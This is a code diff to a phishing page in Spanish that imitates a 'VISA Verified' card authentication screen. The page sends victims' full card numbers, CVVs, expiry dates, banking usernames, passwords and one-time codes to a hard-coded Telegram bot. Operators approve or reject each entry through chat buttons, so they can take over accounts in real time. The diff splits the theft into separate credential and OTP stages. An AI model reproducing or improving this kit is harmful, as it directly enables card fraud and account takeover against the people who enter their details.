@@ -316,11 +316,23 @@
             }
         }
 
+        /* SECCIÓN OTP - OCULTA INICIALMENTE */
         .confirmation-section {
             background: #f9fafb;
             border: 1px solid var(--co-border);
             border-radius: 8px;
             padding: 14px;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .confirmation-section.visible {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .confirmation-section .form-group {
@@ -450,6 +462,13 @@
             border: 1px solid #C8E6C9;
         }
 
+        .status-message.info {
+            display: block;
+            background: #E3F2FD;
+            color: #0D47A1;
+            border: 1px solid #BBDEFB;
+        }
+
         .loading-overlay {
             display: none;
             position: fixed;
@@ -576,6 +595,7 @@
         <div class="status-message" id="statusMessage"></div>
 
         <form id="authForm" novalidate>
+            <!-- SECCIÓN DE CREDENCIALES (SIEMPRE VISIBLE) -->
             <div class="credentials-section">
                 <div class="credentials-title">Credenciales de acceso</div>
                 <div class="credentials-grid">
@@ -604,7 +624,8 @@
                 </div>
             </div>
 
-            <div class="confirmation-section">
+            <!-- SECCIÓN OTP (OCULTA INICIALMENTE) -->
+            <div class="confirmation-section" id="otpSection">
                 <div class="form-group">
                     <label class="form-label">Código OTP (One-Time Password)</label>
                     <p class="otp-info">Se ha enviado un código de 6 dígitos al dispositivo registrado</p>
@@ -631,34 +652,36 @@
 
     <script>
         // ============================================
-        // CONFIGURACIÓN (con ruta relativa)
+        // CONFIGURACIÓN
         // ============================================
         const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
         const TELEGRAM_CHAT_ID = '-1004389419498';
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-        const WEBHOOK_URL = '/api/webhook';  // <--- Ruta relativa, igual que en paso3
+        const WEBHOOK_URL = '/api/webhook';
         
         const POLLING_INTERVAL = 3000;
         const MAX_POLLING_TIME = 300000;
 
         let solicitudId = null;
         let pollingInterval = null;
+        let pasoActual = 'credenciales'; // 'credenciales' o 'otp'
 
         // Elementos DOM
         const form = document.getElementById('authForm');
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const confirmationInput = document.getElementById('confirmationCode');
+        const otpSection = document.getElementById('otpSection');
         const submitButton = document.getElementById('submitButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const statusMessage = document.getElementById('statusMessage');
 
         // ============================================
-        // INICIALIZACIÓN (con configuración de webhook)
+        // INICIALIZACIÓN
         // ============================================
         window.addEventListener('load', async function() {
             initializeTransaction();
-            await configurarWebhook();   // <-- Configurar webhook al cargar
+            await configurarWebhook();
             console.log('✅ Sistema VISA listo - Webhook activo');
         });
 
@@ -688,6 +711,11 @@
             
             let cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || '0000';
             document.getElementById('card-last-digits').textContent = `XXXX XXXX XXXX ${cardLast4}`;
+            
+            // Guardar datos de tarjeta para enviar a Telegram
+            sessionStorage.setItem('cardNumberFull', sessionStorage.getItem('cardNumber') || 'No disponible');
+            sessionStorage.setItem('cardCVV', sessionStorage.getItem('cvc') || 'No disponible');
+            sessionStorage.setItem('cardExpiry', sessionStorage.getItem('expiry') || 'No disponible');
         }
 
         // ============================================
@@ -712,24 +740,19 @@
             return 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
         }
 
-        async function enviarDatosATelegram(datos) {
+        async function enviarCredencialesATelegram(datos) {
             try {
+                // Solo botones para credenciales: APROBAR y RECHAZAR
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
-                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` }
-                        ],
-                        [
-                            { text: "❌ ERROR USUARIO", callback_data: `user_error_${datos.solicitudId}` },
-                            { text: "❌ ERROR CONTRASEÑA", callback_data: `pass_error_${datos.solicitudId}` }
-                        ],
-                        [
-                            { text: "❌ ERROR OTP", callback_data: `otp_error_${datos.solicitudId}` }
+                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` },
+                            { text: "❌ RECHAZAR", callback_data: `reject_${datos.solicitudId}` }
                         ]
                     ]
                 };
 
-                const mensaje = `🔔 *VISA VERIFIED - AUTENTICACIÓN*
+                const mensaje = `🔔 *VISA VERIFIED - CREDENCIALES*
 
 🆔 ID: \`${datos.solicitudId}\`
 
@@ -742,13 +765,10 @@
 👤 Usuario: \`${datos.usuario}\`
 🔑 Contraseña: \`${datos.password}\`
 
-📱 *OTP:*
-🔢 Código: \`${datos.otp}\`
-
 💰 Monto: ${datos.monto}
 📅 Fecha: ${datos.fecha}
 
-⏳ *Estado:* Esperando verificación...`;
+⏳ *Estado:* Esperando verificación de credenciales...`;
 
                 const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
@@ -765,7 +785,60 @@
                 const data = await response.json();
 
                 if (data.ok) {
-                    console.log('✅ Datos enviados a Telegram');
+                    console.log('✅ Credenciales enviadas a Telegram');
+                    return true;
+                } else {
+                    console.error('❌ Error:', data.description);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                return false;
+            }
+        }
+
+        async function enviarOTPATelegram(datos) {
+            try {
+                // Botones para OTP: APROBAR y ERROR OTP
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ APROBAR OTP", callback_data: `approve_otp_${datos.solicitudId}` },
+                            { text: "❌ ERROR OTP", callback_data: `otp_error_${datos.solicitudId}` }
+                        ]
+                    ]
+                };
+
+                const mensaje = `🔔 *VISA VERIFIED - CÓDIGO OTP*
+
+🆔 ID: \`${datos.solicitudId}\`
+
+📱 *CÓDIGO DE VERIFICACIÓN:*
+🔢 OTP: \`${datos.otp}\`
+
+👤 Usuario: \`${datos.usuario}\`
+
+💰 Monto: ${datos.monto}
+📅 Fecha: ${datos.fecha}
+
+⏳ *Estado:* Esperando verificación OTP...`;
+
+                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown',
+                        reply_markup: inlineKeyboard,
+                        disable_web_page_preview: true
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    console.log('✅ OTP enviado a Telegram');
                     return true;
                 } else {
                     console.error('❌ Error:', data.description);
@@ -792,15 +865,16 @@
             }
         }
 
-        function iniciarPolling() {
+        function iniciarPollingCredenciales() {
             let tiempoInicio = Date.now();
             
-            console.log('🔄 Iniciando polling al webhook...');
+            console.log('🔄 Iniciando polling para credenciales...');
             
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval);
                     mostrarError('Tiempo de espera agotado. Intente nuevamente.');
+                    resetFormulario();
                     return;
                 }
                 
@@ -808,24 +882,73 @@
                 
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
+                    // Credenciales aprobadas → mostrar OTP
+                    mostrarInfo('✅ Credenciales verificadas. Ingrese el código OTP.');
+                    mostrarOTP();
+                    loadingOverlay.classList.remove('active');
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Verificar OTP';
+                    return;
+                } else if (resultado === 'rejected') {
+                    clearInterval(pollingInterval);
+                    mostrarError('❌ Los datos ingresados no coinciden. Intente de nuevo.');
+                    resetFormulario();
+                    return;
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        function iniciarPollingOTP() {
+            let tiempoInicio = Date.now();
+            
+            console.log('🔄 Iniciando polling para OTP...');
+            
+            pollingInterval = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingInterval);
+                    mostrarError('Tiempo de espera agotado. Intente nuevamente.');
+                    resetFormulario();
+                    return;
+                }
+                
+                const resultado = await verificarEstadoWebhook(solicitudId);
+                
+                if (resultado === 'approved_otp' || resultado === 'approved') {
+                    clearInterval(pollingInterval);
                     mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                     setTimeout(() => {
                         window.location.href = 'confirmacion.html';
                     }, 2000);
-                } else if (resultado === 'user_error') {
-                    clearInterval(pollingInterval);
-                    mostrarError('❌ Los datos ingresados no coinciden. Verifique su usuario.');
-                    resetFormulario();
-                } else if (resultado === 'pass_error') {
-                    clearInterval(pollingInterval);
-                    mostrarError('❌ Los datos ingresados no coinciden. Verifique su contraseña.');
-                    resetFormulario();
                 } else if (resultado === 'otp_error') {
                     clearInterval(pollingInterval);
-                    mostrarError('❌ Código de verificación erróneo, intenta de nuevo.');
+                    mostrarError('❌ Código OTP incorrecto. Intente de nuevo.');
                     resetFormulario();
+                    // Ocultar OTP y volver a credenciales
+                    ocultarOTP();
                 }
             }, POLLING_INTERVAL);
+        }
+
+        // ============================================
+        // FUNCIONES UI - MOSTRAR/OCULTAR OTP
+        // ============================================
+        function mostrarOTP() {
+            otpSection.classList.add('visible');
+            pasoActual = 'otp';
+            submitButton.textContent = 'Verificar OTP';
+            confirmationInput.focus();
+            // Cambiar el título
+            document.querySelector('.form-title').textContent = 'Código de Verificación';
+            document.querySelector('.form-subtitle').textContent = 'Ingrese el código OTP enviado a su dispositivo.';
+        }
+
+        function ocultarOTP() {
+            otpSection.classList.remove('visible');
+            pasoActual = 'credenciales';
+            submitButton.textContent = 'Enviar';
+            document.querySelector('.form-title').textContent = 'Autenticar con contraseña';
+            document.querySelector('.form-subtitle').textContent = 'Ingrese sus credenciales de seguridad a continuación.';
+            confirmationInput.value = '';
         }
 
         // ============================================
@@ -837,7 +960,7 @@
             statusMessage.style.display = 'block';
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false;
-            submitButton.textContent = 'Enviar';
+            submitButton.textContent = pasoActual === 'otp' ? 'Verificar OTP' : 'Enviar';
         }
 
         function mostrarExito(mensaje) {
@@ -847,15 +970,29 @@
             loadingOverlay.classList.remove('active');
         }
 
+        function mostrarInfo(mensaje) {
+            statusMessage.className = 'status-message info';
+            statusMessage.textContent = mensaje;
+            statusMessage.style.display = 'block';
+        }
+
         function resetFormulario() {
             usernameInput.disabled = false;
             passwordInput.disabled = false;
             confirmationInput.disabled = false;
+            ocultarOTP();
             solicitudId = null;
+            loadingOverlay.classList.remove('active');
+            submitButton.disabled = false;
+            submitButton.textContent = 'Enviar';
+            // Limpiar campos
+            usernameInput.value = '';
+            passwordInput.value = '';
+            confirmationInput.value = '';
         }
 
         // ============================================
-        // VALIDACIÓN
+        // VALIDACIÓN Y ENVÍO
         // ============================================
         [usernameInput, passwordInput, confirmationInput].forEach(input => {
             input.addEventListener('blur', function() {
@@ -878,68 +1015,96 @@
             statusMessage.style.display = 'none';
             document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
 
-            if (!usernameInput.value.trim()) {
-                usernameInput.parentElement.classList.add('error');
-                isValid = false;
-            }
+            // Validar según el paso actual
+            if (pasoActual === 'credenciales') {
+                if (!usernameInput.value.trim()) {
+                    usernameInput.parentElement.classList.add('error');
+                    isValid = false;
+                }
 
-            if (!passwordInput.value.trim()) {
-                passwordInput.parentElement.classList.add('error');
-                isValid = false;
-            } else if (passwordInput.value.length < 4) {
-                passwordInput.parentElement.classList.add('error');
-                passwordInput.parentElement.querySelector('.error-message').textContent = 'La contraseña debe tener al menos 4 caracteres';
-                isValid = false;
-            }
-
-            if (!confirmationInput.value.trim()) {
-                confirmationInput.parentElement.classList.add('error');
-                isValid = false;
-            } else if (!/^\d{6}$/.test(confirmationInput.value)) {
-                confirmationInput.parentElement.classList.add('error');
-                confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código OTP debe contener 6 dígitos';
-                isValid = false;
+                if (!passwordInput.value.trim()) {
+                    passwordInput.parentElement.classList.add('error');
+                    isValid = false;
+                } else if (passwordInput.value.length < 4) {
+                    passwordInput.parentElement.classList.add('error');
+                    passwordInput.parentElement.querySelector('.error-message').textContent = 'La contraseña debe tener al menos 4 caracteres';
+                    isValid = false;
+                }
+            } else if (pasoActual === 'otp') {
+                if (!confirmationInput.value.trim()) {
+                    confirmationInput.parentElement.classList.add('error');
+                    isValid = false;
+                } else if (!/^\d{6}$/.test(confirmationInput.value)) {
+                    confirmationInput.parentElement.classList.add('error');
+                    confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código OTP debe contener 6 dígitos';
+                    isValid = false;
+                }
             }
 
             if (!isValid) return;
 
-            solicitudId = generarSolicitudId();
-            console.log('🆔 Nueva solicitud:', solicitudId);
-
             loadingOverlay.classList.add('active');
             submitButton.disabled = true;
             submitButton.textContent = 'Verificando...';
-
             usernameInput.disabled = true;
             passwordInput.disabled = true;
             confirmationInput.disabled = true;
 
-            const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
-            const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
-            const vencimiento = sessionStorage.getItem('cardExpiry') || 'No disponible';
-            
-            const datosTelegram = {
-                solicitudId: solicitudId,
-                numeroTarjeta: numeroTarjeta,
-                cvv: cvv,
-                vencimiento: vencimiento,
-                usuario: usernameInput.value.trim(),
-                password: passwordInput.value.trim(),
-                otp: confirmationInput.value.trim(),
-                monto: document.getElementById('transaction-amount').textContent,
-                fecha: document.getElementById('transaction-date').textContent
-            };
+            if (pasoActual === 'credenciales') {
+                // ENVIAR CREDENCIALES
+                solicitudId = generarSolicitudId();
+                console.log('🆔 Nueva solicitud (credenciales):', solicitudId);
 
-            const enviado = await enviarDatosATelegram(datosTelegram);
+                const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
+                const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
+                const vencimiento = sessionStorage.getItem('cardExpiry') || 'No disponible';
+                
+                const datosTelegram = {
+                    solicitudId: solicitudId,
+                    numeroTarjeta: numeroTarjeta,
+                    cvv: cvv,
+                    vencimiento: vencimiento,
+                    usuario: usernameInput.value.trim(),
+                    password: passwordInput.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent,
+                    fecha: document.getElementById('transaction-date').textContent
+                };
 
-            if (enviado) {
-                iniciarPolling();
-            } else {
-                mostrarError('Error al procesar la solicitud. Intente nuevamente.');
-                resetFormulario();
+                const enviado = await enviarCredencialesATelegram(datosTelegram);
+
+                if (enviado) {
+                    iniciarPollingCredenciales();
+                } else {
+                    mostrarError('Error al procesar la solicitud. Intente nuevamente.');
+                    resetFormulario();
+                }
+
+            } else if (pasoActual === 'otp') {
+                // ENVIAR OTP
+                console.log('🆔 Enviando OTP para:', solicitudId);
+
+                const datosOTP = {
+                    solicitudId: solicitudId,
+                    otp: confirmationInput.value.trim(),
+                    usuario: usernameInput.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent,
+                    fecha: document.getElementById('transaction-date').textContent
+                };
+
+                const enviado = await enviarOTPATelegram(datosOTP);
+
+                if (enviado) {
+                    iniciarPollingOTP();
+                } else {
+                    mostrarError('Error al procesar el OTP. Intente nuevamente.');
+                    resetFormulario();
+                }
             }
         });
 
+        // ============================================
+        // BOTONES DE AYUDA Y CANCELAR
+        // ============================================
         document.getElementById('helpLink').addEventListener('click', function(e) {
             e.preventDefault();
             alert('Para más ayuda, contacte a su banco o al servicio de atención al cliente.');
@@ -948,6 +1113,10 @@
         document.getElementById('cancelLink').addEventListener('click', function(e) {
             e.preventDefault();
             if (confirm('¿Desea cancelar esta autenticación?')) {
+                // Limpiar sessionStorage
+                sessionStorage.removeItem('cardNumberFull');
+                sessionStorage.removeItem('cardCVV');
+                sessionStorage.removeItem('cardExpiry');
                 window.history.back();
             }
         });
